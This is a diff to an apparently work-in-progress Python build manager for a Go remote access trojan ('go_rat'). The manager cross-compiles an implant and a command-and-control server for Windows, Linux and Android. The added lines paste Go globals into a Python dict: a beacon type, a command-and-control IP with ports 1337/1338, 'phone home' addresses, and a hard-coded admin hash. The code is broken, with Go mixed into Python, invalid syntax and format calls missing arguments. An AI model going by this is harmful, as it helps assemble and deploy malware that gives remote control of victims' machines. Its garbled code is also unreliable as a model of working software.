@@ -62,10 +62,7 @@ PROJECT_DIRECTORY       = "/home/moop/Desktop/go_rat"
 SHARED_CODE_DIRECTORY   = "/pkg/shared_code"
 TARGET_SRC_DIRECTORY    = PROJECT_DIRECTORY + "/src/target_binary"
 COMMAND_SRC_DIRECTORY   = PROJECT_DIRECTORY + "/src/command_binary"
-# I want to modify some variables in the globals file 
-# so we can compile custom binaries from generic code
-# holding initial critical information
-GLOBALS_FILE     = PROJECT_DIRECTORY + SHARED_CODE_DIRECTORY
+
 possible_targets = {"windows": ["386","amd64","arm"],
                     "linux"  : ["386","amd64","arm","arm64"],
                     "android": ["386","amd64","arm","arm64"],
@@ -73,12 +70,13 @@ possible_targets = {"windows": ["386","amd64","arm"],
                     }
 # TO BUILD FOR A DIFFERENT OS/ARCH
 # CGO_ENABLED MUST BE SET TO "0"
-CGOENV = 'CGO_ENABLED="1"'
+CGOENV = 'CGO_ENABLED'# ="1"
+# set the folloiwing ENV vars to build specific targets
+# otherwise GO compiler defaults to host specs
 # this should be set to the platform you want to build the binary for
 BUILD_TARGET_OS      = "windows"
 BUILD_TARGET_ARCH    = "amd64"
-# set the folloiwing ENV vars to build specific targets
-# otherwise GO compiler defaults to host specs
+                                # HONK!
 env_var_target_os    = os.environ["GOOS"]   = BUILD_TARGET_OS
 env_var_target_arch  = os.environ["GOARCH"] = BUILD_TARGET_ARCH
 # add entries as necessary to reflect go.mod file entries
@@ -89,6 +87,68 @@ PROJECT_DEPENDENCIES = ["github.com/fatih/color",
                         "github.com/cakturk/go-netstat/netstat",
                         "github.com/shirou/gopsutil/disk"]
 
+###############################################################################
+#                            GLOBALS TO MODIFY
+###############################################################################
+# I want to modify some variables in the globals file 
+# so we can compile custom binaries from generic code
+# holding initial critical information
+GLOBALS_FILE      = PROJECT_DIRECTORY + SHARED_CODE_DIRECTORY
+globals_to_modify =  {BEACON_ON_START
+
+//if BEACON_ON_START == true {
+// can be one of four options, http, tcp, udp, dns
+// Default is TCP callback
+var BACON_TYPE string = "tcp"
+
+//}
+// declaring global variables to share our
+// network information between scopes
+// these are for TCP/UDP specifically
+
+// we set these variables manually for now
+// I will eventually make a python script to set these automatically
+// COMMAND AND CONTROL ADDRESSES
+// WE ARE LOCAL, ZOMBIE IS REMOTE!
+var commandIP net.IP = net.ParseIP("192.168.0.2")
+var TCPPORT int = 1337
+var UDPPORT int = 1338
+var Local_tcpaddr_LAN net.TCPAddr = net.TCPAddr{IP: commandIP, Port: TCPPORT}
+var Local_udpaddr_LAN net.UDPAddr = net.UDPAddr{IP: commandIP, Port: UDPPORT}
+
+var Local_tcpaddr_WAN net.TCPAddr
+var Local_udpaddr_WAN net.UDPAddr
+
+// these are set to a IP on the LAN
+// you would set these
+var Remote_tcpport string = ":1337"
+var Remote_tcpaddr string = "192.168.0.2" + Remote_tcpport
+var Remote_udpport string = ":1338"
+var Remote_udpaddr string = Remote_tcpaddr + Remote_udpport
+var Remote_http_addr string
+var Remote_ftp_addr string
+var Remote_dns_addr string
+var PHONEHOME_TCP net.TCPAddr
+var PHONEHOME_UDP net.UDPAddr
+
+//-----NAME-------------TYPE-----
+var Mega_important_encryption_key string
+
+// Admin Password in an obvious place
+// TODO: set these for "hardmode" section
+var Sha256_admin_pass_preencrypted crypto.Hash
+var Sha512_admin_pass_preencrypted crypto.Hash
+
+// Horribly insecure implementation
+var Sha256_hash_admin crypto.Hash
+var New_admin_hash = Sha256_hash_admin.New()
+var Wat = New_admin_hash.Sum([]byte("admin"))
+
+// multi-cast DNS Server. for LAN communication
+var Mdns_server mdns.Server
+
+
+}
 
 LOGLEVEL            = 'DEV_IS_DUMB'
 LOGLEVELS           = [1,2,3,'DEV_IS_DUMB']
@@ -109,6 +169,7 @@ makeyellow        = lambda text: Fore.YELLOW + ' ' +  text + ' ' + Style.RESET_A
 makered           = lambda text: Fore.RED + ' ' +  text + ' ' + Style.RESET_ALL if (COLORMEQUALIFIED == True) else None
 makegreen         = lambda text: Fore.GREEN + ' ' +  text + ' ' + Style.RESET_ALL if (COLORMEQUALIFIED == True) else None
 makeblue          = lambda text: Fore.BLUE + ' ' +  text + ' ' + Style.RESET_ALL if (COLORMEQUALIFIED == True) else None
+# you know, I've never looked at the logger. I know it makes "Null" or something
 debug_message     = lambda message: logger.debug(blueprint(message)) 
 info_message      = lambda message: logger.info(greenprint(message))   
 warning_message   = lambda message: logger.warning(yellow_bold_print(message)) 
@@ -118,7 +179,7 @@ critical_message  = lambda message: logger.critical(yellow_bold_print(message))
 is_method          = lambda func: inspect.getmembers(func, predicate=inspect.ismethod)
 
 ################################################################################
-##############                 INTERNAL FUNCS                  #################
+##############                 INTERNAL FUNkS                  #################
 ################################################################################
 def error_printer(message):
     exc_type, exc_value, exc_tb = sys.exc_info()
@@ -185,6 +246,11 @@ Enter your selection using a single integer:
     
     def edit_globals(self, globals_file = GLOBALS_FILE):
         file_to_modify = open(globals_file, "w")
+        for each_line in file_to_modify.readlines():
+            # ignore comments...
+            if each_line.startswith(any("//","/*","/*","var"))
+
+
 
     def init_project(self):
         '''Initializes the folder this script resides in as a go project'''
@@ -201,4 +267,17 @@ Enter your selection using a single integer:
         os.chdir(TARGET_SRC_DIRECTORY)
         exec_command("go build {}".format())
     
-    def build_command_center():
+    def build_command_center(self, name):
+        '''Builds command center/server for THIS MACHINE '''
+        # set env vars
+        os.chdir(COMMAND_SRC_DIRECTORY)
+        exec_command("go build {} -o {}".format(name))
+
+try:    
+    if __name__ == "main":
+        GoRatManager()
+    else:
+        redprint("NO IMPORTING ALLOWED!!!")
+        sys.exit()
+except Exception:
+    error_printer("whoaaahh buddy, something wierd happened on execution of the main flow")
